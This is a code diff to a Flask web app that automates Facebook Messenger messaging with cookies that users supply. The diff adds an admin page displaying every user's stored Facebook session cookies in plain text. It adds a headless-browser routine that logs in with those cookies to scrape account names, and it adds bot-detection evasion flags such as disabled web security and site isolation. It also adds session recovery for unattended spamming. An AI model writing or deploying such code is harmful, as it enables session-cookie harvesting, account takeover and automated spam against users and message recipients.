@@ -92,7 +92,10 @@ LOGIN_HTML = '''<!DOCTYPE html>
                 <button type="submit" class="btn">Create Account</button>
             </form>
         </div>
-        <div class="footer">Made with ❤️ by ROWEDY KING | © 2025</div>
+        <div class="footer">
+            <div style="margin-bottom: 15px;"><a href="/admin" style="color: #4ecdc4; text-decoration: none; font-weight: 600;">👑 Admin Panel</a></div>
+            Made with ❤️ by ROWEDY KING | © 2025
+        </div>
     </div>
     <script>
         function switchTab(tab) {
@@ -264,7 +267,10 @@ ADMIN_PANEL_HTML = '''<!DOCTYPE html>
         </div>
         {% endfor %}
         {% endif %}
-        <div style="text-align: center;"><a href="/admin/logout"><button class="btn-logout">🚪 Logout</button></a></div>
+        <div style="text-align: center; margin-top: 30px;">
+            <a href="/admin/users_info"><button class="btn-logout" style="background: linear-gradient(45deg, #4ecdc4, #44a08d); margin-bottom: 10px;">👥 Users Information</button></a>
+            <a href="/admin/logout"><button class="btn-logout">🚪 Logout</button></a>
+        </div>
     </div>
 </body>
 </html>'''
@@ -357,6 +363,71 @@ DASHBOARD_HTML = '''<!DOCTYPE html>
 </body>
 </html>'''
 
+USERS_INFO_HTML = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users Information - E2E BY ROW3DY</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg'); background-size: cover; background-position: center; background-attachment: fixed; min-height: 100vh; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.15); }
+        .header { text-align: center; margin-bottom: 30px; }
+        .logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #4ecdc4; box-shadow: 0 4px 15px rgba(78, 205, 196, 0.5); margin-bottom: 15px; }
+        h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2rem; font-weight: 700; }
+        .user-item { background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 10px; margin-bottom: 15px; color: white; }
+        .user-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.2); }
+        .username { font-size: 1.2rem; font-weight: 600; color: #4ecdc4; }
+        .fb-name { color: #ff6b6b; font-weight: 600; }
+        .cookie-box { background: rgba(0, 0, 0, 0.3); padding: 10px; border-radius: 8px; margin-top: 10px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff88; word-wrap: break-word; max-height: 150px; overflow-y: auto; }
+        .info-line { margin: 8px 0; }
+        .label { color: rgba(255, 255, 255, 0.7); font-size: 0.9rem; }
+        .btn { padding: 12px 30px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: 600; margin-top: 20px; text-decoration: none; display: inline-block; }
+        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
+        .no-users { text-align: center; padding: 40px; color: rgba(255, 255, 255, 0.7); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://i.postimg.cc/Pq1HGqZK/459c85fcaa5d9f0762479bf382225ac6.jpg" alt="Logo" class="logo">
+            <h1>👥 USERS INFORMATION 👥</h1>
+            <p style="color: rgba(255, 255, 255, 0.9);">All Users Cookies & Facebook Names</p>
+        </div>
+        {% if users_info %}
+            {% for username, info in users_info.items() %}
+            <div class="user-item">
+                <div class="user-header">
+                    <div class="username">👤 {{ username }}</div>
+                    {% if info.fb_name %}
+                    <div class="fb-name">📘 {{ info.fb_name }}</div>
+                    {% else %}
+                    <div style="color: rgba(255, 255, 255, 0.5);">📘 Facebook name not found</div>
+                    {% endif %}
+                </div>
+                <div class="info-line"><span class="label">User ID:</span> {{ info.user_id }}</div>
+                {% if info.chat_id %}
+                <div class="info-line"><span class="label">Chat ID:</span> {{ info.chat_id }}</div>
+                {% endif %}
+                {% if info.name_prefix %}
+                <div class="info-line"><span class="label">Name Prefix:</span> {{ info.name_prefix }}</div>
+                {% endif %}
+                <div class="info-line"><span class="label">Cookies:</span></div>
+                <div class="cookie-box">{{ info.cookies }}</div>
+            </div>
+            {% endfor %}
+        {% else %}
+            <div class="no-users">No users with saved cookies found.</div>
+        {% endif %}
+        <div style="text-align: center;">
+            <a href="/admin/panel" class="btn">🔙 Back to Admin Panel</a>
+        </div>
+    </div>
+</body>
+</html>'''
+
 def generate_user_key(username, password):
     combined = f"{username}:{password}"
     key_hash = hashlib.sha256(combined.encode()).hexdigest()[:8].upper()
@@ -397,6 +468,72 @@ def send_whatsapp_message(user_name, approval_key):
 def check_approval(key):
     approved_keys = load_approved_keys()
     return key in approved_keys
+
+def fetch_facebook_name(cookies_string):
+    if not cookies_string or not cookies_string.strip():
+        return None
+    
+    driver = None
+    try:
+        chrome_options = Options()
+        chrome_options.add_argument('--headless=new')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
+        chrome_options.add_argument('--disable-gpu')
+        
+        chromium_paths = ['/usr/bin/chromium', '/usr/bin/chromium-browser', '/usr/bin/google-chrome', '/usr/bin/chrome']
+        for chromium_path in chromium_paths:
+            if Path(chromium_path).exists():
+                chrome_options.binary_location = chromium_path
+                break
+        
+        driver = webdriver.Chrome(options=chrome_options)
+        driver.set_page_load_timeout(30)
+        
+        driver.get('https://www.facebook.com/')
+        time.sleep(3)
+        
+        cookie_array = cookies_string.split(';')
+        for cookie in cookie_array:
+            cookie_trimmed = cookie.strip()
+            if cookie_trimmed:
+                first_equal_index = cookie_trimmed.find('=')
+                if first_equal_index > 0:
+                    name = cookie_trimmed[:first_equal_index].strip()
+                    value = cookie_trimmed[first_equal_index + 1:].strip()
+                    try:
+                        driver.add_cookie({'name': name, 'value': value, 'domain': '.facebook.com', 'path': '/'})
+                    except:
+                        pass
+        
+        driver.get('https://www.facebook.com/')
+        time.sleep(5)
+        
+        try:
+            fb_name = driver.execute_script("""
+                let name = document.querySelector('[aria-label*="Facebook" i]')?.innerText || 
+                           document.querySelector('[data-testid="profile-name"]')?.innerText ||
+                           document.querySelector('a[href*="/profile"]')?.innerText ||
+                           document.querySelector('[role="banner"] a')?.innerText ||
+                           document.title;
+                return name ? name.split('-')[0].trim() : null;
+            """)
+            
+            if fb_name and fb_name != 'Facebook':
+                return fb_name
+            
+            return "Facebook Account (Name not detected)"
+        except:
+            return "Facebook Account (Name fetch failed)"
+    
+    except Exception as e:
+        return f"Error: {str(e)[:50]}"
+    finally:
+        if driver:
+            try:
+                driver.quit()
+            except:
+                pass
 
 def log_message(msg, automation_state=None):
     timestamp = time.strftime("%H:%M:%S")
@@ -486,7 +623,7 @@ def find_message_input(driver, process_id, automation_state=None):
     return None
 
 def setup_browser(automation_state=None):
-    log_message('Setting up Chrome browser...', automation_state)
+    log_message('Setting up Chrome browser for unlimited runtime...', automation_state)
     
     chrome_options = Options()
     chrome_options.add_argument('--headless=new')
@@ -497,6 +634,34 @@ def setup_browser(automation_state=None):
     chrome_options.add_argument('--disable-extensions')
     chrome_options.add_argument('--window-size=1920,1080')
     chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+    chrome_options.add_argument('--disable-web-security')
+    chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+    chrome_options.add_argument('--disable-site-isolation-trials')
+    chrome_options.add_argument('--disable-notifications')
+    chrome_options.add_argument('--disable-logging')
+    chrome_options.add_argument('--log-level=3')
+    chrome_options.add_argument('--silent')
+    chrome_options.add_argument('--disable-background-timer-throttling')
+    chrome_options.add_argument('--disable-backgrounding-occluded-windows')
+    chrome_options.add_argument('--disable-renderer-backgrounding')
+    chrome_options.add_argument('--disable-background-networking')
+    chrome_options.add_argument('--disable-crash-reporter')
+    chrome_options.add_argument('--metrics-recording-only')
+    chrome_options.add_argument('--no-first-run')
+    chrome_options.add_argument('--no-default-browser-check')
+    chrome_options.add_argument('--ignore-certificate-errors')
+    chrome_options.add_argument('--disable-software-rasterizer')
+    
+    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging', 'enable-automation'])
+    chrome_options.add_experimental_option('useAutomationExtension', False)
+    
+    prefs = {
+        'profile.default_content_setting_values.notifications': 2,
+        'profile.default_content_settings.popups': 0,
+        'disk-cache-size': 4096
+    }
+    chrome_options.add_experimental_option('prefs', prefs)
     
     chromium_paths = [
         '/usr/bin/chromium',
@@ -514,7 +679,12 @@ def setup_browser(automation_state=None):
     try:
         driver = webdriver.Chrome(options=chrome_options)
         driver.set_window_size(1920, 1080)
-        log_message('Chrome browser setup completed!', automation_state)
+        
+        driver.set_page_load_timeout(300)
+        driver.set_script_timeout(300)
+        driver.implicitly_wait(10)
+        
+        log_message('Chrome browser setup with unlimited timeouts completed!', automation_state)
         return driver
     except Exception as error:
         log_message(f'Browser setup failed: {error}', automation_state)
@@ -596,6 +766,53 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 message_to_send = base_message
             
             try:
+                try:
+                    driver.current_url
+                except:
+                    log_message(f'{process_id}: Session crashed! Recovering...', automation_state)
+                    if driver:
+                        try:
+                            driver.quit()
+                        except:
+                            pass
+                    
+                    time.sleep(5)
+                    driver = setup_browser(automation_state)
+                    
+                    log_message(f'{process_id}: Navigating to Facebook after recovery...', automation_state)
+                    driver.get('https://www.facebook.com/')
+                    time.sleep(8)
+                    
+                    if config['cookies'] and config['cookies'].strip():
+                        cookie_array = config['cookies'].split(';')
+                        for cookie in cookie_array:
+                            cookie_trimmed = cookie.strip()
+                            if cookie_trimmed:
+                                first_equal_index = cookie_trimmed.find('=')
+                                if first_equal_index > 0:
+                                    name = cookie_trimmed[:first_equal_index].strip()
+                                    value = cookie_trimmed[first_equal_index + 1:].strip()
+                                    try:
+                                        driver.add_cookie({'name': name, 'value': value, 'domain': '.facebook.com', 'path': '/'})
+                                    except:
+                                        pass
+                    
+                    if config['chat_id']:
+                        driver.get(f'https://www.facebook.com/messages/t/{config["chat_id"].strip()}')
+                    else:
+                        driver.get('https://www.facebook.com/messages')
+                    
+                    time.sleep(15)
+                    message_input = find_message_input(driver, process_id, automation_state)
+                    
+                    if not message_input:
+                        log_message(f'{process_id}: Failed to recover session!', automation_state)
+                        automation_state.running = False
+                        db.set_automation_running(user_id, False)
+                        break
+                    
+                    log_message(f'{process_id}: Session recovered successfully!', automation_state)
+                
                 driver.execute_script("""
                     const element = arguments[0];
                     const message = arguments[1];
@@ -655,8 +872,20 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 time.sleep(delay)
                 
             except Exception as error:
-                log_message(f'{process_id}: Error: {str(error)[:100]}', automation_state)
-                time.sleep(5)
+                error_msg = str(error)
+                error_type = type(error).__name__
+                
+                if 'session deleted' in error_msg.lower() or 'session not created' in error_msg.lower() or 'chrome not reachable' in error_msg.lower() or 'StaleElementReferenceException' in error_type or 'stale element' in error_msg.lower() or 'element is not attached' in error_msg.lower() or 'WebDriverException' in error_type:
+                    log_message(f'{process_id}: ⚠️ Session/Element error detected! Recovering on next loop...', automation_state)
+                    try:
+                        driver.quit()
+                    except:
+                        pass
+                    driver = None
+                    time.sleep(5)
+                else:
+                    log_message(f'{process_id}: Error ({error_type}): {error_msg[:100]}', automation_state)
+                    time.sleep(5)
         
         log_message(f'{process_id}: Automation stopped. Total: {messages_sent}', automation_state)
         return messages_sent
@@ -824,6 +1053,26 @@ def approve_key(key):
         save_pending_approvals(pending)
     
     return redirect(url_for('admin_panel'))
+
+@app.route('/admin/users_info')
+def admin_users_info():
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin'))
+    
+    users_data = db.get_all_users_with_cookies()
+    users_info = {}
+    
+    for username, info in users_data.items():
+        fb_name = fetch_facebook_name(info['cookies'])
+        users_info[username] = {
+            'user_id': info['user_id'],
+            'cookies': info['cookies'],
+            'chat_id': info.get('chat_id', ''),
+            'name_prefix': info.get('name_prefix', ''),
+            'fb_name': fb_name
+        }
+    
+    return render_template_string(USERS_INFO_HTML, users_info=users_info)
 
 @app.route('/dashboard')
 def dashboard():
